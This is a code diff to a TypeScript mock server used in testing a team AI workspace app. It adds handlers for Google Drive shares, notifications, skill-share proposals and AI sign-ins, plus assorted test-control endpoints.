+    listDriveShares: () => ({ items: this.driveShares.map((x) => ({ ...x, usedBy: this.driveShareUsers(x) })) }),
+    authorizeDriveShare: (c) => {
+      this.driveShareFlow = { id: 'share-flow-' + uuidv7(), shareId: c.body.shareId ?? null, polls: 0 }
+      return { flowId: this.driveShareFlow.id, authorizationUrl: 'https://accounts.google.com/o/oauth2/v2/auth?state=synthetic-share', expiresAt: new Date(Date.now() + 600_000).toISOString() }
+    },
+    completeDriveShareFlow: (c) => {
+      const f = this.driveShareFlow
+      if (!f || f.id !== c.params.id) fail('not_found', 404, 'drive_not_found')
+      this.driveShareFlow = null
+      const at = now(), me = { id: c.user.id, name: c.user.name }
+      if (f!.shareId) {
+        const x = this.driveShares.find((y) => y.id === f!.shareId)
+        if (!x) fail('not_found', 404, 'drive_not_found')
+        Object.assign(x!, { status: 'connected', reason: null, owner: me, updatedAt: at })
+        return { ...x!, usedBy: this.driveShareUsers(x!) }
+      }
+      const name = (c.body.name ?? '').trim() || 'Company Drive'
+      if (this.driveShares.some((y) => y.name.toLowerCase() === name.toLowerCase())) fail('conflict', 409, 'drive_name_taken')
+      const x: MockDriveShare = { id: uuidv7(), name, account: { name: 'Admin Fixture', email: 'drive-admin@example.test' }, owner: me, folders: [], wholeDrive: false,
+        access: { everyone: false, groups: [], users: [] }, status: 'connected', reason: null, usedBy: 0, createdAt: at, updatedAt: at }
+      this.driveShares.push(x)
+      return x
+    },
+    driveShareFolders: (c) => {
+      const q = (c.query.q ?? '').trim().toLowerCase()
+      const all = q ? [...this.driveTopFolders(), ...DRIVE_SUBFOLDERS] : this.driveTopFolders()
+      return { items: all.filter((f) => !q || f.name.toLowerCase().includes(q)) }
+    },
+    updateDriveShare: (c) => {
+      const x = this.driveShares.find((y) => y.id === c.params.id)
+      if (!x) fail('not_found', 404, 'drive_not_found')
+      const b = c.body
+      if (b.name !== undefined && this.driveShares.some((y) => y.id !== x!.id && y.name.toLowerCase() === b.name!.trim().toLowerCase())) fail('conflict', 409, 'drive_name_taken')
+      const known = [...this.driveTopFolders(), ...DRIVE_SUBFOLDERS]
+      if (b.folders && b.folders.some((id: string) => !known.some((f) => f.id === id))) fail('bad_request', 400, 'drive_folder_invalid')
+      if (b.name !== undefined) x!.name = b.name.trim()
+      if (b.wholeDrive !== undefined) x!.wholeDrive = b.wholeDrive
+      if (b.folders) x!.folders = x!.wholeDrive ? [] : b.folders.map((id: string) => known.find((f) => f.id === id)!)
+      if (b.access) x!.access = b.access
+      x!.updatedAt = now()
+      return { ...x!, usedBy: this.driveShareUsers(x!) }
+    },
+    stopDriveShare: (c) => {
+      if (!this.driveShares.some((y) => y.id === c.params.id)) fail('not_found', 404, 'drive_not_found')
+      this.driveShares = this.driveShares.filter((y) => y.id !== c.params.id)
+      return { stopped: true, revocation: 'revoked' }
+    },
     // Admin › App connectors (integrations/google-drive/admin-setup.ts): this test server has a public address, so an
     // admin can set Google up; a file must list the redirect URI, like the real server checks.
     driveAdminStatus: () => this.driveAdminStatus(),
@@ -2599,10 +3369,185 @@ export class MockServer {
       id: x.id, user: { id: x.userId, name: this.users.find((u) => u.id === x.userId)?.name ?? x.userId }, repeat: x.repeat, time: x.time, weekday: x.weekday, day: x.day, date: x.date, reviewSince: x.reviewSince ?? null,
     })) }),
     listScheduleTemplates: () => ({ items: [{ id: 'daily-file-index', version: 1, repeat: 'daily' }, { id: 'weekly-summary', version: 1, repeat: 'weekly' }], timeZone: 'Asia/Seoul' }),
-    listNotifications: () => ({ items: [], nextCursor: null, unreadCount: 0 }),
-    getNotificationPreferences: () => ({ scheduleSuccess: true, scheduleFailure: true, connectionReconnect: true, skillSuggestions: true }),
+    listNotifications: (c) => {
+      const mine = this.inbox.filter((n) => n.userId === c.user.id)
+      return { items: mine.map((n) => this.inboxItem(n)), nextCursor: null, unreadCount: mine.filter((n) => !n.readAt).length }
+    },
+    getNotification: (c) => this.inboxItem(this.inbox.find((n) => n.id === c.params.id && n.userId === c.user.id) ?? fail('not_found', 404)),
+    markNotificationRead: (c) => {
+      const n = this.inbox.find((x) => x.id === c.params.id && x.userId === c.user.id) ?? fail('not_found', 404)
+      n.readAt ??= now()
+      this.publish({ type: 'notice', data: { level: 'info', code: 'notifications.changed', message: '' } })
+      return this.inboxItem(n)
+    },
+    getNotificationPreferences: () => this.notifyPrefs,
+    // the server's rule for the older apps' roomMessages (server/src/notifications/preferences.ts savePreferences)
+    updateNotificationPreferences: (c) => {
+      const b = c.body
+      const level = b.roomLevel ?? (b.roomMessages === false ? 'none' : b.roomMessages === true && this.notifyPrefs.roomLevel === 'none' ? 'direct' : this.notifyPrefs.roomLevel)
+      this.notifyPrefs = { ...this.notifyPrefs, ...b, roomLevel: level, roomMessages: level !== 'none', quietHours: b.quietHours ?? this.notifyPrefs.quietHours, roomThreadReplies: b.roomThreadReplies ?? this.notifyPrefs.roomThreadReplies }
+      return this.notifyPrefs
+    },
     getPushSettings: () => ({ configured: false, enabled: false, publicKey: null, subscriptionId: null }),
-    listRemoteConnectors: () => ({ configured: false, resource: null, items: [] }),
+    // ---------------- 내 스킬 가져오기 (shared/src/api/skill-shares.ts, docs/DECISIONS.md "SK") ----------------
+    // The team connector is on here (GET /api/connectors/remote: configured, at this server's /mcp), so the welcome
+    // step shows its Claude Code line. A share proposal is a fixed, realistic one whatever was sent (the server's
+    // checks and AI are not mocked): 10 candidates from a folder (3 recommended: one with a file, one similar to a team
+    // skill and merged by default; 4 other: personal, a personal path, two dev; 3 excluded: a secret, scripts, a
+    // plugin), a CLAUDE.md rule of 5 lines with 12 dropped; from Claude Code (POST with source "claude_code", as the
+    // share_skills tool would) 12 candidates from 2 projects and two tools. It reads `checking` (every row unjudged)
+    // for the first two reads and `ready` from the third. Applying writes the ticked skills as team skills, opens a
+    // chat for a merge and records the welcome progress's shared skills. The proposals belong to the server's
+    // generation, so /__test/reset clears them.
+    ...((): Partial<Record<ApiName, Handler>> => {
+      type Share = import('@mycel/shared/api').SkillShare
+      type Cand = import('@mycel/shared/api').ShareCandidate
+      // group: the group it goes to (docs/DECISIONS.md "Group skills"), null for the team
+      type Row = { share: Share; owner: string; reads: number; group: string | null }
+      const self = this as unknown as { skillShareState?: { gen: number; rows: Row[] } }
+      const rows = (): Row[] => {
+        if (self.skillShareState?.gen !== this.generation) self.skillShareState = { gen: this.generation, rows: [] }
+        return self.skillShareState.rows
+      }
+      /** a member of a group with a folder of its own (the groups Admin › Groups made): they write its skills */
+      const writes = (u: User, groupId: string) => this.groupSkillRoots(u).some((g) => g.id === groupId)
+      // the proposer's own; a share to a group also for its members who may write its skills (server: share.ts ownRow)
+      const mine = (c: Ctx) => rows().find((r) => r.share.id === c.params.id && (r.owner === c.user.id || (r.group !== null && writes(c.user, r.group)))) ?? fail('not_found', 404)
+      /** what the caller reads of a share: where it goes, who proposed it, whether they may apply it */
+      const forCaller = (r: Row, s: Share, u: User): Share => {
+        const g = r.group ? this.groups.find((x) => x.id === r.group) : null
+        const own = r.owner === u.id
+        const open = s.status === 'checking' || s.status === 'ready'
+        return {
+          ...s, targetGroup: r.group ? { id: r.group, name: g?.name ?? null } : null,
+          proposer: { id: r.owner, name: this.users.find((x) => x.id === r.owner)?.name ?? r.owner }, mine: own,
+          canApply: r.group ? writes(u, r.group) : own, targets: own && open ? this.groupSkillRoots(u).map((x) => ({ id: x.id, name: x.name })) : [],
+        }
+      }
+      const cand = (name: string, title: string, group: Cand['group'], reason: Cand['reason'], o: Partial<Cand> = {}): Cand => ({
+        name, title, description: `${title} — ${name}`, origin: 'user', project: null, group, reason, detail: null, personalPath: false,
+        files: group === 'excluded' ? [] : [{ path: 'SKILL.md', bytes: 1200 }], scriptsDropped: 0, sameName: null, similar: null, action: 'add', applied: null, ...o,
+      })
+      const fixture = (cc: boolean): Cand[] => [
+        cand('weekly-report', '주간 업무 보고', 'recommended', 'team_any'),
+        cand('quote-draft', '견적서 초안', 'recommended', 'with_file', { detail: '견적 양식', files: [{ path: 'SKILL.md', bytes: 1400 }, { path: 'templates/견적 양식.md', bytes: 2100 }] }),
+        cand('meeting-notes', '회의록 정리', 'recommended', 'similar', { detail: '회의록 요약', similar: { path: 'skills/meetings/summary/SKILL.md', title: '회의록 요약' }, action: 'merge' }),
+        cand('my-schedule', '내 일정 정리', 'other', 'personal'),
+        cand('vendor-mail', '거래처 메일', 'other', 'personal_path', { personalPath: true }),
+        cand('commit-message', '커밋 메시지', 'other', 'dev'),
+        cand('pr-review', 'PR 리뷰', 'other', 'dev', { scriptsDropped: 1 }),
+        ...(cc ? [cand('standup', '스탠드업 메모', 'other', 'personal', { origin: 'project', project: 'acme-web' }), cand('api-docs', 'API 문서', 'other', 'dev', { origin: 'project', project: 'acme-api' })] : []),
+        cand('slack-notify', '슬랙 알림', 'excluded', 'secret', { detail: 'slack' }),
+        cand('deploy', '배포하기', 'excluded', 'scripts'),
+        cand('frontend-design', 'frontend-design', 'excluded', 'plugin', { origin: 'plugin' }),
+      ]
+      /** what a read shows: unjudged while checking */
+      const view = (r: Row): Share => r.share.status !== 'checking' ? r.share
+        : { ...r.share, candidates: r.share.candidates.map((x) => (x.group === 'excluded' ? x : { ...x, group: 'other', reason: 'unjudged', detail: null, action: x.sameName ? 'merge' : 'add' })) }
+      const read = (r: Row): Share => {
+        // held (/__test/share-hold): checking until the page ends it (stop-check)
+        if (r.share.status === 'checking' && !this.shareHold && ++r.reads > 2) r.share = { ...r.share, status: 'ready', ai: 'done' }
+        return view(r)
+      }
+      const skillText = (name: string, title: string) => `---\nname: ${name}\ndescription: ${title}\nmetadata:\n  title: ${title}\n---\n# ${title}\n`
+      const put = (path: string, text: string) => {
+        for (let d = path.lastIndexOf('/'); d > 0; d = path.lastIndexOf('/', d - 1)) this.files.set(path.slice(0, d), this.files.get(path.slice(0, d)) ?? { type: 'folder', mtime: now() })
+        this.putFile(path, text)
+      }
+      return {
+        listRemoteConnectors: (c) => ({ configured: true, resource: `${new URL(c.req.url).origin}/mcp`, items: [] }),
+        createSkillShare: (c) => {
+          const b = c.body as import('@mycel/shared/api').CreateSkillShare
+          const cc = b.source === 'claude_code' || b.source === 'codex'
+          const at = now()
+          const share: Share = {
+            id: uuidv7(), source: b.source, app: b.source === 'codex' ? 'codex' : b.app ?? 'claude', status: 'checking', where: cc ? null : b.where ?? '.claude', projects: cc ? b.projects ?? 2 : null,
+            createdAt: at, updatedAt: at, expiresAt: new Date(Date.now() + 7 * 86400_000).toISOString(), ai: 'pending', candidates: fixture(cc),
+            rule: { lines: 5, dropped: 12, path: null, text: '- 보고서는 결론부터 짧게 써요\n- 숫자는 표로 정리해요\n- 고객 이름은 회사 공식 표기를 따라요\n- 일정은 YYYY-MM-DD로 적어요\n- 모르면 추측하지 말고 물어봐요' },
+            tools: cc ? [{ name: 'Notion', url: 'https://mcp.notion.com/mcp', auth: 'oauth', header: null, templateId: null, error: null }, { name: 'Linear', url: 'https://mcp.linear.app/mcp', auth: 'oauth', header: null, templateId: null, error: null }] : [],
+            landing: null,
+          }
+          const group = b.group ?? null
+          if (group && !writes(c.user, group)) fail('validation', 400, '이 그룹의 스킬 폴더에 넣을 수 있는 그룹 멤버만 할 수 있어요.')
+          const r: Row = { share, owner: c.user.id, reads: 0, group }
+          rows().push(r)
+          return forCaller(r, view(r), c.user)
+        },
+        listSkillShares: (c) => ({
+          items: rows().filter((r) => (c.query.scope === 'review'
+            ? r.owner !== c.user.id && r.group !== null && writes(c.user, r.group) && (r.share.status === 'checking' || r.share.status === 'ready')
+            : r.owner === c.user.id) && (!c.query.status || r.share.status === c.query.status) && (!c.query.source || r.share.source === c.query.source))
+            .slice().reverse().map((r) => forCaller(r, read(r), c.user)),
+        }),
+        getSkillShare: (c) => { const r = mine(c); return forCaller(r, read(r), c.user) },
+        setSkillShareTarget: (c) => {
+          const r = rows().find((x) => x.share.id === c.params.id && x.owner === c.user.id) ?? fail('not_found', 404)
+          const to = (c.body as { group: string | null }).group
+          if (to && !writes(c.user, to)) fail('validation', 400, '이 그룹의 스킬 폴더에 넣을 수 있는 그룹 멤버만 할 수 있어요.')
+          if (r.share.candidates.some((x) => x.applied)) fail('conflict', 409, '이미 일부를 넣은 공유 제안은 보낼 곳을 바꿀 수 없어요.')
+          r.group = to
+          return forCaller(r, read(r), c.user)
+        },
+        applySkillShare: (c) => {
+          const r = mine(c)
+          if (r.share.status !== 'ready') fail('conflict', 409, r.share.status === 'checking' ? '아직 확인하는 중이에요.' : '이 제안은 이미 끝났어요.')
+          if (r.group ? !writes(c.user, r.group) : r.owner !== c.user.id) fail('forbidden', 403)
+          // a share to a group writes into that group's skills folder, its skills only (no team rule, no tools)
+          const root = r.group ? this.groupSkillRoots(c.user).find((g) => g.id === r.group)!.root : 'skills'
+          const b0 = c.body as import('@mycel/shared/api').ApplySkillShare
+          const b = r.group ? { ...b0, rule: false, tools: [] } : b0
+          const candidates = r.share.candidates.map((x) => ({ ...x }))
+          const added: { path: string; title: string; recommended: boolean }[] = []
+          for (const s of b.skills) {
+            const x = candidates.find((y) => y.name === s.name && y.group !== 'excluded') ?? fail('validation', 400, `${s.name}: 공유할 수 없는 스킬이에요.`)
+            const title = x.title ?? x.name
+            if (s.action === 'merge' && (x.sameName || x.similar)) {
+              const target = (x.sameName ?? x.similar)!.path
+              // while the owner's welcome steps are unfinished a merge waits for their end (docs/DECISIONS.md "W5")
+              if (this.welcome && !this.welcome.finishedAt && c.user.role === 'owner') { x.applied = { status: 'later', path: target, chatId: null, error: null }; continue }
+              const chat: Chat = { id: uuidv7(), projectId: null, title: `${title} 합치기`, engine: 'claude-code', model: null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
+              this.chats.push(chat)
+              x.applied = { status: 'merge', path: target, chatId: chat.id, error: null }
+            } else {
+              const name = s.action === 'separate' ? s.as ?? `${x.name}-2` : x.name
+              const path = `${root}/${name}/SKILL.md`
+              put(path, skillText(name, title))
+              x.applied = { status: 'added', path, chatId: null, error: null }
+              added.push({ path, title, recommended: x.group === 'recommended' })
+            }
+          }
+          const rule = r.share.rule && b.rule ? { ...r.share.rule, path: 'skills/일하는-방식.md' } : r.share.rule
+          if (rule?.path && b.rule) put(rule.path, rule.text)
+          const tools = r.share.tools.map((x) => (b.tools?.includes(x.name) ? { ...x, templateId: uuidv7() } : x))
+          const landing = r.group ? null : (added.find((x) => x.recommended) ?? added[0])?.path ?? null
+          r.share = { ...r.share, status: 'applied', candidates, rule, tools, landing, updatedAt: now() }
+          // applying a share anywhere marks 내 스킬 done for the owner (server: onboarding/welcome.ts recordShared)
+          if (r.group) return forCaller(r, r.share, c.user)
+          if (this.welcome && c.user.role === 'owner') {
+            const w = { ...this.welcome, steps: { ...this.welcome.steps, skills: 'done' as const } }
+            delete w.skillsLater
+            if (added.length) w.shared = { at: this.welcome.shared?.at ?? now(), skills: [...(this.welcome.shared?.skills ?? []), ...added.map(({ path, title }) => ({ path, title }))], landing: this.welcome.shared?.landing ?? landing }
+            this.welcome = this.welcomeSaved(w, now())
+          }
+          return forCaller(r, r.share, c.user)
+        },
+        // the page ends a check (server: skills/share.ts stopSkillShareCheck): ready, nothing recommended (ai failed)
+        stopSkillShareCheck: (c) => {
+          const r = rows().find((x) => x.share.id === c.params.id && x.owner === c.user.id) ?? fail('not_found', 404)
+          if (r.share.status === 'checking') {
+            r.share = { ...r.share, status: 'ready', ai: 'failed', candidates: r.share.candidates.map((x) => (x.group === 'excluded' ? x : { ...x, group: 'other', reason: x.personalPath ? 'personal_path' : 'unjudged', detail: null, similar: null, action: x.sameName ? 'merge' : 'add' })), rule: null, updatedAt: now() }
+          }
+          return forCaller(r, view(r), c.user)
+        },
+        dismissSkillShare: (c) => {
+          const r = mine(c)
+          // the names and descriptions go with it (server: skills/share.ts close)
+          if (r.share.status === 'checking' || r.share.status === 'ready') r.share = { ...r.share, status: 'dismissed', candidates: [], rule: null, tools: [], updatedAt: now() }
+          return undefined
+        },
+      }
+    })(),
+    // ---------------- 내 스킬 가져오기 end ----------------
     connectInfo: () => ({ teamId: 'team-acme', lanCertSha256: null, lanPort: 8443, lanHosts: [], canonicalOrigin: null }),
   }
 
@@ -2611,6 +3556,16 @@ export class MockServer {
     return !c.owner && !c.disabled && (c.kind === 'anthropic-oauth' || c.kind === 'chatgpt') && !this.credSharedSubscriptions
       ? { ...c, state: 'sharing_off', detail: 'Shared subscriptions are off.' } : c
   }
+  /** A group or person deleted: their AI connection assignments go, and a team connection left with none is switched
+   * off rather than serving the whole team (the server's credentials/assignees.ts). */
+  dropAssignee(subjectType: 'group' | 'user', subjectId: string) {
+    for (const c of this.credentials) {
+      if (!c.assignments.some((a) => a.subjectType === subjectType && a.subjectId === subjectId)) continue
+      c.assignments = c.assignments.filter((a) => !(a.subjectType === subjectType && a.subjectId === subjectId))
+      if (!c.assignments.length && c.scope === 'team' && !c.disabled) { c.disabled = true; c.state = 'disabled' }
+    }
+  }
+
   async addCredential(user: User, body: { kind: CredentialKind; label: string; sealed: never; acknowledgedPlanNotice?: boolean; assignments?: { subjectType: 'group' | 'user'; subjectId: string }[] }, personal: boolean): Promise<Credential> {
     if (!personal && (body.kind === 'anthropic-oauth' || body.kind === 'chatgpt') && !this.credSharedSubscriptions) fail('forbidden', 403)
     const secret = await this.sealer.unseal(body.sealed, 'credential.create').catch(() => fail('validation', 400, '보낸 값을 열 수 없어요.'))
@@ -2634,6 +3589,9 @@ export class MockServer {
   /** a ChatGPT sign-in: the code after a moment, then the connection. A Claude sign-in: the authorize address after a
    * moment, then it waits for the pasted code (good-code#good-state connects, anything else is a wrong code). */
   startLogin(user: User, label: string, personal: boolean, reconnectId?: string, kind: CredentialLogin['kind'] = 'chatgpt'): CredentialLogin {
+    // one sign-in at a time (like the server): the owner or an admin is told whose it is and can stop it
+    const running = [...this.credLogins.values()].find((x) => x.state === 'starting' || x.state === 'code' || x.state === 'checking')
+    if (running) fail('busy', 409, '다른 AI 로그인이 진행 중이에요. 하나씩만 할 수 있어요.', undefined, user.role !== 'member' && !personal ? { reason: 'login_busy', loginId: running.loginId, personal: running.personal, starter: this.users.find((u) => u.id === running.userId)?.name ?? '' } : undefined)
     const loginId = 'login' + uuidv7().replace(/-/g, '')
     const l = { loginId, kind, state: 'starting' as CredentialLogin['state'], url: null as string | null, code: null as string | null, expiresAt: new Date(Date.now() + 16 * 60_000).toISOString(), credential: null as Credential | null, reason: null as string | null, userId: user.id, personal, label, reconnectId }
     this.credLogins.set(loginId, l)
@@ -2681,9 +3639,9 @@ export class MockServer {
     if (!l || l.userId !== user.id) return fail('not_found', 404)
     return this.loginView(l)
   }
-  cancelLogin(id: string, user: User) {
+  cancelLogin(id: string, user: User, anyLogin = false) {
     const l = this.credLogins.get(id)
-    if (!l || l.userId !== user.id) fail('not_found', 404)
+    if (!l || (l.userId !== user.id && !anyLogin)) fail('not_found', 404)
     // like the server while it saves the new token: 409 (here for the whole check)
     if (l!.state === 'checking') fail('conflict', 409, '새 토큰을 확인하고 저장하는 중이에요. 곧 끝나요.')
     if (l!.state === 'starting' || l!.state === 'code') { l!.state = 'cancelled'; this.publish({ type: 'credential.login', data: this.loginView(l!) }) }
@@ -2715,7 +3673,21 @@ export class MockServer {
   driveAdminStatus() {
     const configured = this.driveClient !== 'none'
     return { configured, source: configured ? 'app' as const : 'none' as const, canSetUp: true, blocked: null,
-      redirectUri: 'https://team.example.test/api/integrations/google-drive/callback', connectedMembers: 0 }
+      redirectUri: 'https://team.example.test/api/integrations/google-drive/callback', connectedMembers: 0,
+      membersCanConnect: this.driveMembers, sharesOn: configured ? this.driveShares.filter((x) => x.status === 'connected').length : 0 }
+  }
+  /** the speech provider the server reads: the admin's choice, else OpenRouter while the team's key is set, else off */
+  speechNow(): 'off' | 'openrouter' | 'local' {
+    return this.speechChosen ? this.settings.speechProvider : this.speechKey.set ? 'openrouter' : 'off'
+  }
+  driveTopFolders(): MockDriveFolder[] {
+    return [{ id: 'drive-team', name: 'Team Drive', kind: 'drive' }, { id: 'folder-finance', name: 'Finance', kind: 'folder' }, { id: 'folder-hr', name: 'HR', kind: 'folder' }, { id: 'folder-marketing', name: 'Marketing', kind: 'folder' }]
+  }
+  driveShareCovers(x: MockDriveShare, u: User): boolean {
+    return x.access.everyone || x.access.users.includes(u.id) || x.access.groups.some((g) => u.groupIds.includes(g))
+  }
+  driveShareUsers(x: MockDriveShare): number {
+    return this.users.filter((u) => u.status === 'active' && this.driveShareCovers(x, u)).length
   }
   templateCovers(t: { access: IntegrationAccess }, u: User): boolean {
     return t.access.everyone || t.access.users.includes(u.id) || t.access.groups.some((g) => u.groupIds.includes(g))
@@ -2855,7 +3827,7 @@ export class MockServer {
   transcribeGate(chatId: string | undefined) {
     this.transcribeChats.push(chatId ?? null)
     const confidential = chatId ? !!this.chats.find((x) => x.id === chatId)?.confidential : this.allConfidential
-    if (confidential && this.settings.speechProvider === 'openrouter' && this.speechKey.set) {
+    if (confidential && this.speechNow() === 'openrouter' && this.speechKey.set) {
       throw new Fail('forbidden', 403, '기밀 대화라서 녹음을 바깥 음성 서비스(OpenRouter)로 보내지 않았어요. 글로 입력해 주세요.', undefined, { reason: 'confidential' })
     }
   }
@@ -2864,10 +3836,12 @@ export class MockServer {
     const id = uuidv7()
     const job: Job = { id, kind: 'transcribe', status: 'running', progress: null, message: null, result: null, error: null, createdAt: now(), finishedAt: null }
     this.jobs.set(id, job)
+    const slow = this.transcribeProgress
+    if (slow) setTimeout(() => this.publish({ type: 'job.progress', data: { jobId: id, kind: 'transcribe', progress: slow.progress, message: slow.message } }), 50)
     setTimeout(() => {
       Object.assign(job, { status: 'done', progress: 1, result: { text: '받아쓴 문장입니다', language: 'ko', durationSec: 2 }, finishedAt: now() })
       this.publish({ type: 'job.done', data: { job } })
-    }, 150)
+    }, slow?.ms ?? 150)
     void user
     return id
   }
@@ -2879,9 +3853,14 @@ export class MockServer {
     const url = new URL(req.url)
     const p = url.pathname
     if (p.startsWith('/__test/')) return this.testControl(p, req)
-    if (!p.startsWith('/api/')) return pageHeaders(serveWeb(req, { dist, dev: false, devPort: 0, teamIcon: () => this.teamIcon }) ?? new Response('no', { status: 404 }))
+    if (!p.startsWith('/api/')) {
+      const res = serveWeb(req, { dist, dev: false, devPort: 0, teamIcon: () => this.teamIcon }) ?? new Response('no', { status: 404 })
+      return pageHeaders(p === '/sw.js' && res.ok ? await withoutWorkerBadge(res) : res)
+    }
     this.log.push(`${req.method} ${p}`)
-    const route = this.routes.find((r) => r.ep.method === req.method && r.re.test(p))
+    // like the server's router: a path written out ("/api/intro-decks/builds") wins over one with a parameter there
+    // ("/api/intro-decks/:id")
+    const route = this.routes.filter((r) => r.ep.method === req.method && r.re.test(p)).sort((a, b) => a.ep.path.split(':').length - b.ep.path.split(':').length)[0]
     try {
       if (!route) return fail('not_found', 404)
       const h = this.handlers[route.name]
@@ -2891,7 +3870,7 @@ export class MockServer {
       const user = this.userOf(req)
       if (ep.auth !== 'public') {
         if (!user) fail('unauthorized', 401)
-        if ((ep.auth === 'admin' && user!.role === 'member') || ((ep.auth === 'owner' || ep.auth === 'owner-reauth') && user!.role !== 'owner')) fail('forbidden', 403)
+        if (((ep.auth === 'admin' || ep.auth === 'admin-reauth') && user!.role === 'member') || ((ep.auth === 'owner' || ep.auth === 'owner-reauth') && user!.role !== 'owner')) fail('forbidden', 403)
         // like the server: a temporary password reaches only the endpoints that change it
         if (user!.mustChangePassword && !ep.allowWhilePasswordChange) fail('password_change_required', 403)
       }
@@ -2904,7 +3883,9 @@ export class MockServer {
       let body: any
       let file: File | undefined
       if (ep.body && isSchema(ep.body)) {
-        const parsed = (ep.body as z.ZodType).safeParse(await req.json())
+        // like the server (http/route.ts): an empty body reads as {} (an endpoint whose fields are all optional)
+        const text = await req.text()
+        const parsed = (ep.body as z.ZodType).safeParse(text.trim() ? JSON.parse(text) : {})
         if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
         body = parsed.data
       } else if (ep.body && (ep.body as { kind: string }).kind === 'multipart') {
@@ -2935,25 +3916,60 @@ export class MockServer {
 
   async testControl(p: string, req: Request): Promise<Response> {
     const body = (await req.json().catch(() => ({}))) as Json
-    if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined })
+    if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined, withAdmin: !!body.withAdmin })
     else if (p === '/__test/drop-ws') for (const ws of this.sockets) ws.close(WsClose.serviceRestart, 'restart')
+    else if (p === '/__test/handover') {
+      if (typeof body.flag === 'boolean') this.handover.flag = body.flag
+      if (body.recovery !== undefined) this.handover.recovery = body.recovery as HandoverRecovery | null
+      if (Array.isArray(body.connections)) this.handover.connections = body.connections as MockServer['handover']['connections']
+      if (body.race === true) this.handover.race = true
+    }
+    else if (p === '/__test/presence' && req.method === 'GET') return Response.json({ sent: this.presenceSent })
+    else if (p === '/__test/presence') {
+      // {people: [{id, state}]}: a change, told to every socket like the server's presence frame ('offline' takes one out)
+      const people = (body.people as { id: string; state: 'online' | 'away' | 'offline' }[]) ?? []
+      for (const x of people) {
+        if (x.state === 'offline') this.presence.delete(x.id)
+        else this.presence.set(x.id, x.state)
+      }
+      const frame = JSON.stringify(PresenceFrame.parse({ type: 'presence', full: false, people }))
+      for (const ws of this.sockets) ws.send(frame)
+    }
     else if (p === '/__test/server-version') this.serverVersion = String(body.version)
     else if (p === '/__test/upload-delay') this.uploadDelayMs = Number(body.ms)
+    else if (p === '/__test/file-rank' && req.method === 'GET') return Response.json(this.fileRankCalls)
+    else if (p === '/__test/file-rank') this.fileRank = { ai: (body.ai as typeof this.fileRank.ai | undefined) ?? 'done', delayMs: Number(body.delayMs ?? 0) }
+    else if (p === '/__test/deck-pace') {
+      this.deckPaceMs = Number(body.ms ?? 40)
+      this.deckThumbs = body.thumbs !== false
+      this.deckTier = body.tier === 'standard' || body.tier === 'deep' ? body.tier : 'quick'
+    }
+    else if (p === '/__test/knowledge-graph') this.kg = mockKnowledgeGraph(body.available !== false)
     else if (p === '/__test/cloud') this.cloud = body.on !== false
     else if (p === '/__test/popular-skills') this.popular = (body.items as { path: string; uses: number; users: number }[]) ?? []
     else if (p === '/__test/team-goal') this.teamGoal = body.goal === null ? null : TeamGoal.parse(body.goal)
     else if (p === '/__test/result-suggestion') this.resultSuggestion = body.suggestion ? (body.suggestion as unknown as import('@mycel/shared/api').ResultSuggestion) : null
+    else if (p === '/__test/html-pdf' && req.method === 'GET') return Response.json(this.htmlPdfCalls)
+    else if (p === '/__test/html-pdf') this.htmlPdf = body.on !== false
     else if (p === '/__test/dev-env') {
-      const by = this.users[0] ? { id: this.users[0].id, name: this.users[0].name } : null
-      const run = (id: string, kind: 'job' | 'server', name: string, position: number | null, lastLine: string) => ({ id, kind, name, by, startedAt: now(), runAt: position === null ? now() : null, position, memoryMiB: position === null ? 320 : null, lastLine })
       if (body.network === 'offline') this.devEnvTeam.network = 'offline'
       if (Array.isArray(body.sites)) this.devEnvSites.set(this.users[0]!.id, { sites: (body.sites as string[]).map((host) => ({ host, createdAt: now() })), full: false })
-      this.devEnv = { box: body.box === 'running' ? 'running' : 'stopped', ...(body.srt ? { srt: { running: [run('r1', 'server', 'npm run dev', null, 'ready on http://localhost:3000')], waiting: [run('r2', 'job', 'render', 1, '')] } } : {}) }
+      this.devEnv = body.srt ? { srt: { running: [], waiting: [] } } : {}
     }
+    else if (p === '/__test/pack-examples') this.packExamples = (body.examples as typeof this.packExamples | undefined) ?? {}
+    else if (p === '/__test/packs-fail') this.packsFail = body.on !== false
+    else if (p === '/__test/prepared-fail') this.preparedFail = body.on !== false
+    else if (p === '/__test/pack-install-fail') this.packInstallFails = Number(body.times ?? 1)
+    else if (p === '/__test/share-hold') this.shareHold = body.on !== false
     else if (p === '/__test/skill-list') this.aiList = SkillsOverview.shape.aiList.parse(body)
+    else if (p === '/__test/team-address') this.teamAddress = typeof body.address === 'string' ? body.address : null
     else if (p === '/__test/connection') this.connection = { ...this.connection, ...(body as unknown as Partial<ConnectionStatus>) }
     else if (p === '/__test/speech-host') this.speechHost = { ...this.speechHost, ...(body as unknown as Partial<typeof this.speechHost>) }
     else if (p === '/__test/memory') this.memories.push({ id: uuidv7(), text: String(body.text), sourceChatId: null, createdAt: now() })
+    else if (p === '/__test/ai-allowances') this.aiAllowances = ((body.items as unknown[]) ?? []).map((a) => AiAllowance.parse(a))
+    // a server event as the server would send it (a room's change card for a turn the spec's page.route answers; a
+    // room's room.message.updated after a refused post)
+    else if (p === '/__test/publish') this.publish(body.event as unknown as ServerEventInput)
     else if (p === '/__test/schedule') {
       // a scheduled task the owner confirmed on its card (or a template: templateId), for Settings › Scheduled tasks
       const owner = this.users.find((u) => u.role === 'owner')!
@@ -2984,8 +4000,10 @@ export class MockServer {
     else if (p === '/__test/speech') {
       this.settings.speechProvider = body.provider === 'openrouter' || body.provider === 'off' ? body.provider : 'local'
       this.speechKey = body.key ? { set: true, hint: 'mock', updatedAt: now() } : { set: false, hint: null, updatedAt: null }
+      this.speechChosen = body.chosen !== false
     }
     else if (p === '/__test/transcribe-chats') return Response.json(this.transcribeChats)
+    else if (p === '/__test/transcribe-progress') this.transcribeProgress = { message: String(body.message), progress: typeof body.progress === 'number' ? body.progress : null, ms: Number(body.ms ?? 3000) }
     else if (p === '/__test/file') {
       // a team file for a test (POST {path, text} or {path, base64}); its folders are made too
       const path = String(body.path)
